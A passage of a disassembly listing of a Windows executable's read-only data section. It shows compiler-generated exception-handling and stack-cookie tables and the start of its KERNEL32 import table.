stru_42307C     UnwindMapEntry <-1, 0>  ; DATA XREF: .rdata:stru_4230A0↓o
                UnwindMapEntry <-1, 0>
stru_42308C     TryBlockMapEntry <0, 0, 1, 1, offset stru_42306C>
                                        ; DATA XREF: .rdata:stru_4230A0↓o
stru_4230A0     FuncInfo <19930522h, 2, offset stru_42307C, 1, offset stru_42308C, 0, \
                                        ; DATA XREF: sub_417EA1+67F3↑o
                          0, 0, 1>
                db    0
                db    0
                db    0
                db    0
stru_4230C8     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_417EEA+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 417EEA
                dd 0FFFFFFB4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_41800A    ; ScopeRecord.HandlerFunc
                dd 0                    ; ScopeRecord.EnclosingLevel
                dd offset loc_417F7A    ; ScopeRecord.FilterFunc
                dd offset loc_417F83    ; ScopeRecord.HandlerFunc
stru_4230F0     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_418086+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 418086
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd offset loc_4181F1    ; ScopeRecord.FilterFunc
                dd offset loc_4181F5    ; ScopeRecord.HandlerFunc
                align 10h
stru_423110     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_418205+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 418205
                dd 0FFFFFFD8h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd offset loc_41828A    ; ScopeRecord.FilterFunc
                dd offset loc_41828E    ; ScopeRecord.HandlerFunc
unk_42312C      db    0                 ; DATA XREF: sub_4183F9+15A↑o
                db    0
                db    0
                db    0
                dd offset sub_417BA8
                align 8
                dd offset unk_42313C
unk_42313C      db    2                 ; DATA XREF: .rdata:00423138↑o
                db    0
                db    0
                db    0
                dd offset unk_423148
                dd offset unk_4232A4
unk_423148      db    0                 ; DATA XREF: .rdata:00423140↑o
                db    0
                db    0
                db    0
                dd offset off_425DB4
                db    0
                db    0
                db    0
                db    0
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
                db  0Ch
                db    0
                db    0
                db    0
                dd offset sub_418740
                align 8
stru_423168     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_418843+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 418843
                dd 0FFFFFFD8h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd offset loc_418863    ; ScopeRecord.FilterFunc
                dd offset loc_418867    ; ScopeRecord.HandlerFunc
                align 8
stru_423188     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_41888F+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 41888F
                dd 0FFFFFFD8h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd offset loc_4188B3    ; ScopeRecord.FilterFunc
                dd offset loc_4188B7    ; ScopeRecord.HandlerFunc
                align 8
stru_4231A8     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_4189B1+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 4189B1
                dd 0FFFFFFCCh           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_418AC0    ; ScopeRecord.HandlerFunc
                align 8
stru_4231C8     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_419944+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 419944
                dd 0FFFFFFD4h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_419A3B    ; ScopeRecord.HandlerFunc
                align 8
stru_4231E8     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_419AC4+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 419AC4
                dd 0FFFFFFC0h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_419C32    ; ScopeRecord.HandlerFunc
                align 8
stru_423208     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_419CA1+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 419CA1
                dd 0FFFFFFD0h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd offset loc_419CC2    ; ScopeRecord.FilterFunc
                dd offset loc_419CD9    ; ScopeRecord.HandlerFunc
                align 8
stru_423228     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_419DE7+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 419DE7
                dd 0FFFFFFD0h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_419E7D    ; ScopeRecord.HandlerFunc
                align 8
stru_423248     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_41A5A5+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 41A5A5
                dd 0FFFFFFCCh           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_41A63E    ; ScopeRecord.HandlerFunc
                align 8
stru_423268     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_41ADBB+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 41ADBB
                dd 0FFFFFFD0h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_41AE92    ; ScopeRecord.HandlerFunc
                align 8
stru_423288     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_41E20A+2↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 41E20A
                dd 0FFFFFFD8h           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd offset loc_41E237    ; ScopeRecord.FilterFunc
                dd offset loc_41E253    ; ScopeRecord.HandlerFunc
unk_4232A4      db    0                 ; DATA XREF: .rdata:00423144↑o
                                        ; .rdata:00423304↓o ...
                db    0
                db    0
                db    0
                dd offset off_42AA14
                align 10h
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
                db  0Ch
                db    0
                db    0
                db    0
                dd offset sub_40E6B9
unk_4232C0      db    0                 ; DATA XREF: .rdata:004232FC↓o
                db    0
                db    0
                db    0
                dd offset off_42AA30
                db    0
                db    0
                db    0
                db    0
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
                db  28h ; (
                db    0
                db    0
                db    0
                dd offset sub_401220
unk_4232DC      db    0                 ; DATA XREF: .rdata:00423300↓o
                                        ; .rdata:0042333C↓o
                db    0
                db    0
                db    0
                dd offset off_42AA50
                align 8
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
                db  28h ; (
                db    0
                db    0
                db    0
                dd offset sub_401240
unk_4232F8      db    3                 ; DATA XREF: .rdata:00423314↓o
                db    0
                db    0
                db    0
                dd offset unk_4232C0
                dd offset unk_4232DC
                dd offset unk_4232A4
unk_423308      db    0                 ; DATA XREF: sub_40AA20+66↑o
                                        ; sub_40E2A3+29↑o
                db    0
                db    0
                db    0
                dd offset sub_401170
                db    0
                db    0
                db    0
                db    0
                dd offset unk_4232F8
unk_423318      db    0                 ; DATA XREF: .rdata:00423338↓o
                db    0
                db    0
                db    0
                dd offset off_42AA70
                db    0
                db    0
                db    0
                db    0
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
                db  28h ; (
                db    0
                db    0
                db    0
                dd offset sub_409620
unk_423334      db    3                 ; DATA XREF: .rdata:00423350↓o
                db    0
                db    0
                db    0
                dd offset unk_423318
                dd offset unk_4232DC
                dd offset unk_4232A4
unk_423344      db    0                 ; DATA XREF: sub_4092F0+6A↑o
                                        ; sub_409D40+64↑o ...
                db    0
                db    0
                db    0
                dd offset sub_401170
                align 10h
                dd offset unk_423334
unk_423354      db    0                 ; DATA XREF: .rdata:00423374↓o
                db    0
                db    0
                db    0
                dd offset off_42AA90
                align 10h
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db 0FFh ; ÿ
                db    0
                db    0
                db    0
                db    0
                db  0Ch
                db    0
                db    0
                db    0
                dd offset sub_40B030
unk_423370      db    2                 ; DATA XREF: .rdata:00423388↓o
                db    0
                db    0
                db    0
                dd offset unk_423354
                dd offset unk_4232A4
unk_42337C      db    0                 ; DATA XREF: sub_409DC0+40↑o
                                        ; sub_409FA0+44↑o ...
                db    0
                db    0
                db    0
                dd offset sub_401000
                align 8
                dd offset unk_423370
                align 10h
stru_423390     dd 0FFFFFFFEh           ; GSCookieOffset
                                        ; DATA XREF: sub_40DB70+5↑o
                dd 0                    ; GSCookieXOROffset ; SEH scope table for function 40DB70
                dd 0FFFFFFBCh           ; EHCookieOffset
                dd 0                    ; EHCookieXOROffset
                dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
                dd 0                    ; ScopeRecord.FilterFunc
                dd offset loc_40DC82    ; ScopeRecord.HandlerFunc
stru_4233AC     UnwindMapEntry <-1, 0>  ; DATA XREF: .rdata:stru_423414↓o
                UnwindMapEntry <-1, 0>
                UnwindMapEntry <1, 0>
                UnwindMapEntry <1, 0>
stru_4233CC     HandlerType <40h, 0, 0, offset loc_40A90E>
                                        ; DATA XREF: .rdata:stru_4233EC↓o
stru_4233DC     HandlerType <40h, 0, 0, offset loc_40A87F>
                                        ; DATA XREF: .rdata:00423400↓o
stru_4233EC     TryBlockMapEntry <2, 2, 3, 1, offset stru_4233CC>
                                        ; DATA XREF: .rdata:stru_423414↓o
                TryBlockMapEntry <0, 0, 3, 1, offset stru_4233DC>
stru_423414     FuncInfo <19930522h, 4, offset stru_4233AC, 2, offset stru_4233EC, 0, \
                                        ; DATA XREF: SEH_40A7D0+11↑o
                          0, 0, 1>
stru_423438     UnwindMapEntry <-1, offset sub_41E6C0>
                                        ; DATA XREF: .rdata:stru_423440↓o
stru_423440     FuncInfo <19930522h, 1, offset stru_423438, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_4091F0+11↑o
stru_423464     UnwindMapEntry <-1, offset sub_41E6F0>
                                        ; DATA XREF: .rdata:stru_42346C↓o
stru_42346C     FuncInfo <19930522h, 1, offset stru_423464, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_401240+11↑o
stru_423490     UnwindMapEntry <-1, offset sub_41E720>
                                        ; DATA XREF: .rdata:stru_423498↓o
stru_423498     FuncInfo <19930522h, 1, offset stru_423490, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_4010D0+11↑o
stru_4234BC     UnwindMapEntry <-1, offset sub_41E750>
                                        ; DATA XREF: .rdata:stru_4234C4↓o
stru_4234C4     FuncInfo <19930522h, 1, offset stru_4234BC, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_40AEF0+11↑o
stru_4234E8     UnwindMapEntry <-1, 0>  ; DATA XREF: .rdata:stru_423524↓o
                UnwindMapEntry <0, offset j_nullsub_2>
                UnwindMapEntry <-1, 0>
stru_423500     HandlerType <40h, 0, 0, offset loc_40A7B0>
                                        ; DATA XREF: .rdata:stru_423510↓o
stru_423510     TryBlockMapEntry <0, 1, 2, 1, offset stru_423500>
                                        ; DATA XREF: .rdata:stru_423524↓o
stru_423524     FuncInfo <19930522h, 3, offset stru_4234E8, 1, offset stru_423510, 0, \
                                        ; DATA XREF: SEH_40A730+11↑o
                          0, 0, 1>
stru_423548     UnwindMapEntry <-1, offset sub_41E7A0>
                                        ; DATA XREF: .rdata:stru_423560↓o
                UnwindMapEntry <0, offset sub_41E7A8>
                UnwindMapEntry <1, offset sub_41E7B0>
stru_423560     FuncInfo <19930522h, 3, offset stru_423548, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_404E40+1E↑o
stru_423584     UnwindMapEntry <-1, offset sub_41E7E0>
                                        ; DATA XREF: .rdata:stru_42358C↓o
stru_42358C     FuncInfo <19930522h, 1, offset stru_423584, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_4041F0+24↑o
stru_4235B0     UnwindMapEntry <-1, offset sub_41E820>
                                        ; DATA XREF: .rdata:stru_4235FC↓o
                UnwindMapEntry <0>
                UnwindMapEntry <1, offset j_nullsub_2_0>
                UnwindMapEntry <1, 0>
                UnwindMapEntry <0>
stru_4235D8     HandlerType <40h, 0, 0, offset loc_40B792>
                                        ; DATA XREF: .rdata:stru_4235E8↓o
stru_4235E8     TryBlockMapEntry <1, 3, 4, 1, offset stru_4235D8>
                                        ; DATA XREF: .rdata:stru_4235FC↓o
stru_4235FC     FuncInfo <19930522h, 5, offset stru_4235B0, 1, offset stru_4235E8, 0, \
                                        ; DATA XREF: SEH_40B6B0+1B↑o
                          0, 0, 1>
stru_423620     UnwindMapEntry <-1, 0>  ; DATA XREF: .rdata:stru_42365C↓o
                UnwindMapEntry <0, offset j_nullsub_2_1>
                UnwindMapEntry <-1, 0>
stru_423638     HandlerType <40h, 0, 0, offset loc_40B54B>
                                        ; DATA XREF: .rdata:stru_423648↓o
stru_423648     TryBlockMapEntry <0, 1, 2, 1, offset stru_423638>
                                        ; DATA XREF: .rdata:stru_42365C↓o
stru_42365C     FuncInfo <19930522h, 3, offset stru_423620, 1, offset stru_423648, 0, \
                                        ; DATA XREF: SEH_40B4E0+11↑o
                          0, 0, 1>
stru_423680     UnwindMapEntry <-1, 0>  ; DATA XREF: .rdata:stru_4236BC↓o
                UnwindMapEntry <0, offset j_nullsub_2_2>
                UnwindMapEntry <-1, 0>
stru_423698     HandlerType <40h, 0, 0, offset loc_40B14B>
                                        ; DATA XREF: .rdata:stru_4236A8↓o
stru_4236A8     TryBlockMapEntry <0, 1, 2, 1, offset stru_423698>
                                        ; DATA XREF: .rdata:stru_4236BC↓o
stru_4236BC     FuncInfo <19930522h, 3, offset stru_423680, 1, offset stru_4236A8, 0, \
                                        ; DATA XREF: SEH_40B0E0+11↑o
                          0, 0, 1>
stru_4236E0     UnwindMapEntry <-1, offset sub_41E8A0>
                                        ; DATA XREF: .rdata:stru_4236E8↓o
stru_4236E8     FuncInfo <19930522h, 1, offset stru_4236E0, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_40AA20+11↑o
stru_42370C     UnwindMapEntry <-1, offset sub_41E8D0>
                                        ; DATA XREF: .rdata:stru_423714↓o
stru_423714     FuncInfo <19930522h, 1, offset stru_42370C, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_40A3B0+11↑o
stru_423738     UnwindMapEntry <-1, offset sub_41E900>
                                        ; DATA XREF: .rdata:stru_423740↓o
stru_423740     FuncInfo <19930522h, 1, offset stru_423738, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_40A940+11↑o
stru_423764     UnwindMapEntry <-1, offset j_nullsub_2_3>
                                        ; DATA XREF: .rdata:stru_42376C↓o
stru_42376C     FuncInfo <19930522h, 1, offset stru_423764, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_408F30+11↑o
stru_423790     UnwindMapEntry <-1, offset sub_41E950>
                                        ; DATA XREF: .rdata:stru_4237CC↓o
                UnwindMapEntry <0>
                UnwindMapEntry <0>
stru_4237A8     HandlerType <40h, 0, 0, offset loc_408837>
                                        ; DATA XREF: .rdata:stru_4237B8↓o
stru_4237B8     TryBlockMapEntry <1, 1, 2, 1, offset stru_4237A8>
                                        ; DATA XREF: .rdata:stru_4237CC↓o
stru_4237CC     FuncInfo <19930522h, 3, offset stru_423790, 1, offset stru_4237B8, 0, \
                                        ; DATA XREF: SEH_408740+11↑o
                          0, 0, 1>
stru_4237F0     UnwindMapEntry <-1, offset sub_41E980>
                                        ; DATA XREF: .rdata:stru_4237F8↓o
stru_4237F8     FuncInfo <19930522h, 1, offset stru_4237F0, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_408630+10↑o
stru_42381C     UnwindMapEntry <-1, offset sub_41E9A0>
                                        ; DATA XREF: .rdata:stru_423824↓o
stru_423824     FuncInfo <19930522h, 1, offset stru_42381C, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_4084B0+11↑o
stru_423848     UnwindMapEntry <-1, offset sub_41E9D0>
                                        ; DATA XREF: .rdata:stru_4238D0↓o
                UnwindMapEntry <-1, offset sub_41E9DD>
                UnwindMapEntry <0, offset sub_41E9E8>
                UnwindMapEntry <2, offset sub_41E9F3>
                UnwindMapEntry <3, offset sub_41E9FE>
                UnwindMapEntry <4, offset sub_41EA09>
                UnwindMapEntry <5, offset sub_41EA14>
                UnwindMapEntry <2, offset sub_41EA1F>
                UnwindMapEntry <7, offset sub_41EA2A>
                UnwindMapEntry <8, offset sub_41EA35>
                UnwindMapEntry <2, offset sub_41EA40>
                UnwindMapEntry <2, offset sub_41EA4B>
                UnwindMapEntry <2, offset sub_41EA56>
                UnwindMapEntry <2, offset sub_41EA61>
                UnwindMapEntry <2, offset sub_41EA6C>
                UnwindMapEntry <2, offset sub_41EA77>
                UnwindMapEntry <2, offset sub_41EA82>
stru_4238D0     FuncInfo <19930522h, 17, offset stru_423848, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_407940+24↑o
stru_4238F4     UnwindMapEntry <-1, offset sub_41EAC0>
                                        ; DATA XREF: .rdata:stru_4238FC↓o
stru_4238FC     FuncInfo <19930522h, 1, offset stru_4238F4, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_407620+24↑o
stru_423920     UnwindMapEntry <-1, offset sub_41EB00>
                                        ; DATA XREF: .rdata:stru_423940↓o
                UnwindMapEntry <-1, offset sub_41EB0B>
                UnwindMapEntry <-1, offset sub_41EB16>
                UnwindMapEntry <-1, offset sub_41EB21>
stru_423940     FuncInfo <19930522h, 4, offset stru_423920, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_406A40+24↑o
stru_423964     UnwindMapEntry <-1, offset sub_41EB60>
                                        ; DATA XREF: .rdata:stru_42396C↓o
stru_42396C     FuncInfo <19930522h, 1, offset stru_423964, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_4064E0+24↑o
stru_423990     UnwindMapEntry <-1, offset sub_41EBA0>
                                        ; DATA XREF: .rdata:stru_4239A0↓o
                UnwindMapEntry <-1, offset sub_41EBAB>
stru_4239A0     FuncInfo <19930522h, 2, offset stru_423990, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_4062E0+24↑o
stru_4239C4     UnwindMapEntry <-1, offset sub_41EBF0>
                                        ; DATA XREF: .rdata:stru_4239D4↓o
                UnwindMapEntry <-1, offset sub_41EBFB>
stru_4239D4     FuncInfo <19930522h, 2, offset stru_4239C4, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_405F00+24↑o
stru_4239F8     UnwindMapEntry <-1, offset sub_41EC40>
                                        ; DATA XREF: .rdata:stru_423A08↓o
                UnwindMapEntry <0, offset sub_41EC48>
stru_423A08     FuncInfo <19930522h, 2, offset stru_4239F8, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_405850+1E↑o
stru_423A2C     UnwindMapEntry <-1, offset sub_41EC80>
                                        ; DATA XREF: .rdata:stru_423A3C↓o
                UnwindMapEntry <0, offset sub_41EC8B>
stru_423A3C     FuncInfo <19930522h, 2, offset stru_423A2C, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_405710+24↑o
stru_423A60     UnwindMapEntry <-1, offset sub_41ECD0>
                                        ; DATA XREF: .rdata:stru_423A68↓o
stru_423A68     FuncInfo <19930522h, 1, offset stru_423A60, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_4050B0+24↑o
stru_423A8C     UnwindMapEntry <-1, offset sub_41ED10>
                                        ; DATA XREF: .rdata:stru_423A94↓o
stru_423A94     FuncInfo <19930522h, 1, offset stru_423A8C, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_404BF0+24↑o
stru_423AB8     UnwindMapEntry <-1, offset sub_41ED50>
                                        ; DATA XREF: .rdata:stru_423AC0↓o
stru_423AC0     FuncInfo <19930522h, 1, offset stru_423AB8, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_403980+24↑o
stru_423AE4     UnwindMapEntry <-1, offset sub_41ED90>
                                        ; DATA XREF: .rdata:stru_423AF4↓o
                UnwindMapEntry <-1, offset sub_41ED9B>
stru_423AF4     FuncInfo <19930522h, 2, offset stru_423AE4, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_403800+24↑o
stru_423B18     UnwindMapEntry <-1, offset sub_41EDE0>
                                        ; DATA XREF: .rdata:stru_423B20↓o
stru_423B20     FuncInfo <19930522h, 1, offset stru_423B18, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_403630+24↑o
stru_423B44     UnwindMapEntry <-1, offset sub_41EE20>
                                        ; DATA XREF: .rdata:stru_423B54↓o
                UnwindMapEntry <0, offset sub_41EE2B>
stru_423B54     FuncInfo <19930522h, 2, offset stru_423B44, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: sub_41EE36+24↑o
stru_423B78     UnwindMapEntry <-1, offset sub_41EE70>
                                        ; DATA XREF: .rdata:stru_423B88↓o
                UnwindMapEntry <0, offset sub_41EE7B>
stru_423B88     FuncInfo <19930522h, 2, offset stru_423B78, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_402A00+24↑o
stru_423BAC     UnwindMapEntry <-1, 0>  ; DATA XREF: .rdata:stru_423BE8↓o
                UnwindMapEntry <0, offset j_nullsub_2_4>
                UnwindMapEntry <-1, 0>
stru_423BC4     HandlerType <40h, 0, 0, offset loc_40B0A9>
                                        ; DATA XREF: .rdata:stru_423BD4↓o
stru_423BD4     TryBlockMapEntry <0, 1, 2, 1, offset stru_423BC4>
                                        ; DATA XREF: .rdata:stru_423BE8↓o
stru_423BE8     FuncInfo <19930522h, 3, offset stru_423BAC, 1, offset stru_423BD4, 0, \
                                        ; DATA XREF: SEH_40B050+11↑o
                          0, 0, 1>
stru_423C0C     UnwindMapEntry <-1, 0>  ; DATA XREF: .rdata:stru_423C84↓o
                UnwindMapEntry <-1, 0>
                UnwindMapEntry <-1, offset sub_41EEE0>
                UnwindMapEntry <2, 0>
                UnwindMapEntry <2, 0>
                UnwindMapEntry <-1, offset sub_41EEE8>
stru_423C3C     HandlerType <40h, 0, 0, offset loc_40A1FA>
                                        ; DATA XREF: .rdata:stru_423C5C↓o
stru_423C4C     HandlerType <40h, 0, 0, offset loc_40A30B>
                                        ; DATA XREF: .rdata:00423C70↓o
stru_423C5C     TryBlockMapEntry <0, 0, 1, 1, offset stru_423C3C>
                                        ; DATA XREF: .rdata:stru_423C84↓o
                TryBlockMapEntry <3, 3, 4, 1, offset stru_423C4C>
stru_423C84     FuncInfo <19930522h, 6, offset stru_423C0C, 2, offset stru_423C5C, 0, \
                                        ; DATA XREF: SEH_40A030+1B↑o
                          0, 0, 1>
stru_423CA8     UnwindMapEntry <-1, offset sub_41EF20>
                                        ; DATA XREF: .rdata:stru_423CC0↓o
                UnwindMapEntry <-1, offset sub_41EF2B>
                UnwindMapEntry <-1, offset sub_41EF36>
stru_423CC0     FuncInfo <19930522h, 3, offset stru_423CA8, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_407110+24↑o
stru_423CE4     UnwindMapEntry <-1, offset sub_41EF70>
                                        ; DATA XREF: .rdata:stru_423D04↓o
                UnwindMapEntry <-1, offset sub_41EF7B>
                UnwindMapEntry <-1, offset sub_41EF86>
                UnwindMapEntry <-1, offset sub_41EF91>
stru_423D04     FuncInfo <19930522h, 4, offset stru_423CE4, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_406C90+24↑o
stru_423D28     UnwindMapEntry <-1, offset sub_41EFD0>
                                        ; DATA XREF: .rdata:stru_423D30↓o
stru_423D30     FuncInfo <19930522h, 1, offset stru_423D28, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_4067C0+24↑o
stru_423D54     UnwindMapEntry <-1, offset sub_41F010>
                                        ; DATA XREF: .rdata:stru_423D5C↓o
stru_423D5C     FuncInfo <19930522h, 1, offset stru_423D54, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_406690+11↑o
stru_423D80     UnwindMapEntry <-1, offset sub_41F040>
                                        ; DATA XREF: .rdata:stru_423D90↓o
                UnwindMapEntry <-1, offset sub_41F04B>
stru_423D90     FuncInfo <19930522h, 2, offset stru_423D80, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_405C60+24↑o
stru_423DB4     UnwindMapEntry <-1, offset sub_41F090>
                                        ; DATA XREF: .rdata:stru_423DBC↓o
stru_423DBC     FuncInfo <19930522h, 1, offset stru_423DB4, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_4052B0+24↑o
stru_423DE0     UnwindMapEntry <-1, offset sub_41F0D0>
                                        ; DATA XREF: .rdata:stru_423DE8↓o
stru_423DE8     FuncInfo <19930522h, 1, offset stru_423DE0, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_4027B0+1E↑o
stru_423E0C     UnwindMapEntry <-1, offset sub_41F100>
                                        ; DATA XREF: .rdata:stru_423E1C↓o
                UnwindMapEntry <0, offset sub_41F10B>
stru_423E1C     FuncInfo <19930522h, 2, offset stru_423E0C, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_401E10+24↑o
stru_423E40     UnwindMapEntry <-1, 0>  ; DATA XREF: .rdata:stru_423E48↓o
stru_423E48     FuncInfo <19930522h, 1, offset stru_423E40, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_40B900+11↑o
stru_423E6C     UnwindMapEntry <-1, offset sub_41F170>
                                        ; DATA XREF: .rdata:stru_423EB8↓o
                UnwindMapEntry <-1, offset sub_41F178>
                UnwindMapEntry <1, 0>
                UnwindMapEntry <2, offset j_nullsub_2_5>
                UnwindMapEntry <1, 0>
stru_423E94     HandlerType <40h, 0, 0, offset loc_40B617>
                                        ; DATA XREF: .rdata:stru_423EA4↓o
stru_423EA4     TryBlockMapEntry <2, 3, 4, 1, offset stru_423E94>
                                        ; DATA XREF: .rdata:stru_423EB8↓o
stru_423EB8     FuncInfo <19930522h, 5, offset stru_423E6C, 1, offset stru_423EA4, 0, \
                                        ; DATA XREF: SEH_40B580+11↑o
                          0, 0, 1>
stru_423EDC     UnwindMapEntry <-1, 0>  ; DATA XREF: .rdata:stru_423F54↓o
                UnwindMapEntry <-1, 0>
                UnwindMapEntry <-1, offset sub_41F1A0>
                UnwindMapEntry <2, 0>
                UnwindMapEntry <2, 0>
                UnwindMapEntry <-1, offset sub_41F1A8>
stru_423F0C     HandlerType <40h, 0, 0, offset loc_409B95>
                                        ; DATA XREF: .rdata:stru_423F2C↓o
stru_423F1C     HandlerType <40h, 0, 0, offset loc_409C99>
                                        ; DATA XREF: .rdata:00423F40↓o
stru_423F2C     TryBlockMapEntry <0, 0, 1, 1, offset stru_423F0C>
                                        ; DATA XREF: .rdata:stru_423F54↓o
                TryBlockMapEntry <3, 3, 4, 1, offset stru_423F1C>
stru_423F54     FuncInfo <19930522h, 6, offset stru_423EDC, 2, offset stru_423F2C, 0, \
                                        ; DATA XREF: SEH_4099D0+11↑o
                          0, 0, 1>
stru_423F78     UnwindMapEntry <-1, offset sub_41F1D0>
                                        ; DATA XREF: .rdata:stru_423F98↓o
                UnwindMapEntry <-1, offset sub_41F1D8>
                UnwindMapEntry <1, offset sub_41F1E0>
                UnwindMapEntry <1, offset sub_41F1E8>
stru_423F98     FuncInfo <19930522h, 4, offset stru_423F78, 0, 0, 0, 0, 0, 1>
                                        ; DATA XREF: SEH_403F70+11↑o
__IMPORT_DESCRIPTOR_KERNEL32 dd rva off_424050 ; Import Name Table
                dd 0                    ; Time stamp
                dd 0                    ; Forwarder Chain
                dd rva aKernel32Dll     ; DLL Name
                dd rva CreateEventA     ; Import Address Table
